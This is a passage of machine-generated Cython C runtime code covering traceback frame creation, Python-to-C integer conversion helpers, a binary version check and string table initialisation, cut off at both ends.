    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    if (c_line) {
        c_line = __Pyx_CLineForTraceback(tstate, c_line);
    }
    py_code = __pyx_find_code_object(c_line ? -c_line : py_line);
    if (!py_code) {
        py_code = __Pyx_CreateCodeObjectForTraceback(
            funcname, c_line, py_line, filename);
        if (!py_code) goto bad;
        __pyx_insert_code_object(c_line ? -c_line : py_line, py_code);
    }
    py_frame = PyFrame_New(
        tstate,            
        py_code,           
        __pyx_d,    
        0                  
    );
    if (!py_frame) goto bad;
    __Pyx_PyFrame_SetLineNumber(py_frame, py_line);
    PyTraceBack_Here(py_frame);
bad:
    Py_XDECREF(py_code);
    Py_XDECREF(py_frame);
}


static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
    if (is_unsigned) {
        if (sizeof(long) < sizeof(long)) {
            return PyInt_FromLong((long) value);
        } else if (sizeof(long) <= sizeof(unsigned long)) {
            return PyLong_FromUnsignedLong((unsigned long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
            return PyLong_FromUnsignedLongLong((unsigned PY_LONG_LONG) value);
#endif
        }
    } else {
        if (sizeof(long) <= sizeof(long)) {
            return PyInt_FromLong((long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
            return PyLong_FromLongLong((PY_LONG_LONG) value);
#endif
        }
    }
    {
        int one = 1; int little = (int)*(unsigned char *)&one;
        unsigned char *bytes = (unsigned char *)&value;
        return _PyLong_FromByteArray(bytes, sizeof(long),
                                     little, !is_unsigned);
    }
}


#define __PYX_VERIFY_RETURN_INT(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 0)
#define __PYX_VERIFY_RETURN_INT_EXC(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 1)
#define __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, exc)\
    {\
        func_type value = func_value;\
        if (sizeof(target_type) < sizeof(func_type)) {\
            if (unlikely(value != (func_type) (target_type) value)) {\
                func_type zero = 0;\
                if (exc && unlikely(value == (func_type)-1 && PyErr_Occurred()))\
                    return (target_type) -1;\
                if (is_unsigned && unlikely(value < zero))\
                    goto raise_neg_overflow;\
                else\
                    goto raise_overflow;\
            }\
        }\
        return (target_type) value;\
    }


static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(long) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(long, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (long) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case  1: __PYX_VERIFY_RETURN_INT(long, digit, digits[0])
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 2 * PyLong_SHIFT) {
                            return (long) (((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 3 * PyLong_SHIFT) {
                            return (long) (((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 4 * PyLong_SHIFT) {
                            return (long) (((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (long) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(long) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case -1: __PYX_VERIFY_RETURN_INT(long, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(long,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(long) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) ((((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) ((((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) ((((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(long) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            long val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (long) -1;
        }
    } else {
        long val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (long) -1;
        val = __Pyx_PyInt_As_long(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to long");
    return (long) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to long");
    return (long) -1;
}


static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const int neg_one = (int) -1, const_zero = (int) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(int) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(int, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (int) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case  1: __PYX_VERIFY_RETURN_INT(int, digit, digits[0])
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 2 * PyLong_SHIFT) {
                            return (int) (((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 3 * PyLong_SHIFT) {
                            return (int) (((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 4 * PyLong_SHIFT) {
                            return (int) (((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (int) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(int) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case -1: __PYX_VERIFY_RETURN_INT(int, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(int,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(int) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) ((((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) ((((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) ((((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(int) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            int val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (int) -1;
        }
    } else {
        int val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (int) -1;
        val = __Pyx_PyInt_As_int(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to int");
    return (int) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to int");
    return (int) -1;
}


static int __Pyx_check_binary_version(void) {
    char ctversion[4], rtversion[4];
    PyOS_snprintf(ctversion, 4, "%d.%d", PY_MAJOR_VERSION, PY_MINOR_VERSION);
    PyOS_snprintf(rtversion, 4, "%s", Py_GetVersion());
    if (ctversion[0] != rtversion[0] || ctversion[2] != rtversion[2]) {
        char message[200];
        PyOS_snprintf(message, sizeof(message),
                      "compiletime version %s of module '%.100s' "
                      "does not match runtime version %s",
                      ctversion, __Pyx_MODULE_NAME, rtversion);
        return PyErr_WarnEx(NULL, message, 1);
    }
    return 0;
}


static int __Pyx_InitStrings(__Pyx_StringTabEntry *t) {
    while (t->p) {
        #if PY_MAJOR_VERSION < 3
        if (t->is_unicode) {
            *t->p = PyUnicode_DecodeUTF8(t->s, t->n - 1, NULL);
        } else if (t->intern) {
            *t->p = PyString_InternFromString(t->s);
        } else {
            *t->p = PyString_FromStringAndSize(t->s, t->n - 1);
        }
        #else
        if (t->is_unicode | t->is_str) {
            if (t->intern) {
                *t->p = PyUnicode_InternFromString(t->s);
            } else if (t->encoding) {
                *t->p = PyUnicode_Decode(t->s, t->n - 1, t->encoding, NULL);
            } else {
                *t->p = PyUnicode_FromStringAndSize(t->s, t->n - 1);
            }
        } else {
            *t->p = PyBytes_FromStringAndSize(t->s, t->n - 1);
        }
        #endif
        if (!*t->p)
            return -1;
        if (PyObject_Hash(*t->p) == -1)
            return -1;
        ++t;
    }
    return 0;
}

static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char* c_str) {
    return __Pyx_PyUnicode_FromStringAndSize(c_str, (Py_ssize_t)strlen(c_str));
}
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject* o) {
    Py_ssize_t ignore;
    return __Pyx_PyObject_AsStringAndSize(o, &ignore);
}
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
#if !CYTHON_PEP393_ENABLED
static const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    char* defenc_c;
    PyObject* defenc = _PyUnicode_AsDefaultEncodedString(o, NULL);
    if (!defenc) return NULL;
    defenc_c = PyBytes_AS_STRING(defenc);
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    {
        char* end = defenc_c + PyBytes_GET_SIZE(defenc);
        char* c;
        for (c = defenc_c; c < end; c++) {
            if ((unsigned char) (*c) >= 128) {
                PyUnicode_AsASCIIString(o);
                return NULL;
            }
        }
    }
#endif
    *length = PyBytes_GET_SIZE(defenc);
    return defenc_c;
}
#else
static CYTHON_INLINE const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    if (unlikely(__Pyx_PyUnicode_READY(o) == -1)) return NULL;
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    if (likely(PyUnicode_IS_ASCII(o))) {
        *length = PyUnicode_GET_LENGTH(o);
        return PyUnicode_AsUTF8(o);
    } else {
        PyUnicode_AsASCIIString(o);
        return NULL;
    }
#else
    return PyUnicode_AsUTF8AndSize(o, length);
#endif
}
#endif
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
    if (
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
            __Pyx_sys_getdefaultencoding_not_ascii &&
#endif
            PyUnicode_Check(o)) {
        return __Pyx_PyUnicode_AsStringAndSize(o, length);
    } else
#endif
#if (!CYTHON_COMPILING_IN_PYPY) || (defined(PyByteArray_AS_STRING) && defined(PyByteArray_GET_SIZE))
    if (PyByteArray_Check(o)) {
        *length = PyByteArray_GET_SIZE(o);
        return PyByteArray_AS_STRING(o);
    } else
#endif
    {
        char* result;
        int r = PyBytes_AsStringAndSize(o, &result, length);
        if (unlikely(r < 0)) {
            return NULL;
        } else {
            return result;
        }
    }
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject* x) {
   int is_true = x == Py_True;
   if (is_true | (x == Py_False) | (x == Py_None)) return is_true;
   else return PyObject_IsTrue(x);
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject* x) {
    int retval;
    if (unlikely(!x)) return -1;
    retval = __Pyx_PyObject_IsTrue(x);
    Py_DECREF(x);
    return retval;
}
static PyObject* __Pyx_PyNumber_IntOrLongWrongResultType(PyObject* result, const char* type_name) {
#if PY_MAJOR_VERSION >= 3
    if (PyLong_Check(result)) {
        if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,
                "__int__ returned non-int (type %.200s).  "
                "The ability to return an instance of a strict subclass of int "
                "is deprecated, and may be removed in a future version of Python.",
                Py_TYPE(result)->tp_name)) {
            Py_DECREF(result);
            return NULL;
        }
        return result;
    }
#endif
    PyErr_Format(PyExc_TypeError,
                 "__%.4s__ returned non-%.4s (type %.200s)",
                 type_name, type_name, Py_TYPE(result)->tp_name);
    Py_DECREF(result);
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x) {
#if CYTHON_USE_TYPE_SLOTS
  PyNumberMethods *m;
#endif
  const char *name = NULL;
  PyObject *res = NULL;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_Check(x) || PyLong_Check(x)))
#else
  if (likely(PyLong_Check(x)))
#endif
    return __Pyx_NewRef(x);
#if CYTHON_USE_TYPE_SLOTS
  m = Py_TYPE(x)->tp_as_number;
  #if PY_MAJOR_VERSION < 3
  if (m && m->nb_int) {
    name = "int";
    res = m->nb_int(x);
  }
  else if (m && m->nb_long) {
    name = "long";
    res = m->nb_long(x);
  }
  #else
  if (likely(m && m->nb_int)) {
    name = "int";
    res = m->nb_int(x);
  }
  #endif
#else
  if (!PyBytes_CheckExact(x) && !PyUnicode_CheckExact(x)) {
    res = PyNumber_Int(x);
  }
#endif
  if (likely(res)) {
#if PY_MAJOR_VERSION < 3
    if (unlikely(!PyInt_Check(res) && !PyLong_Check(res))) {
#else
    if (unlikely(!PyLong_CheckExact(res))) {
#endif
        return __Pyx_PyNumber_IntOrLongWrongResultType(res, name);
    }
  }
  else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_TypeError,
                    "an integer is required");
  }
  return res;
}
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject* b) {
  Py_ssize_t ival;
  PyObject *x;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_CheckExact(b))) {
    if (sizeof(Py_ssize_t) >= sizeof(long))
        return PyInt_AS_LONG(b);
    else
        return PyInt_AsSsize_t(b);
  }
#endif
  if (likely(PyLong_CheckExact(b))) {
    #if CYTHON_USE_PYLONG_INTERNALS
    const digit* digits = ((PyLongObject*)b)->ob_digit;
    const Py_ssize_t size = Py_SIZE(b);
    if (likely(__Pyx_sst_abs(size) <= 1)) {
        ival = likely(size) ? digits[0] : 0;
        if (size == -1) ival = -ival;
        return ival;
    } else {
      switch (size) {
         case 2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
      }
    }
    #endif
    return PyLong_AsSsize_t(b);
  }
  x = PyNumber_Index(b);
  if (!x) return -1;
  ival = PyInt_AsSsize_t(x);
  Py_DECREF(x);
  return ival;
}
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject* o) {
  if (sizeof(Py_hash_t) == sizeof(Py_ssize_t)) {
    return (Py_hash_t) __Pyx_PyIndex_AsSsize_t(o);
#if PY_MAJOR_VERSION < 3
  } else if (likely(PyInt_CheckExact(o))) {
    return PyInt_AS_LONG(o);
#endif
  } else {
    Py_ssize_t ival;
    PyObject *x;
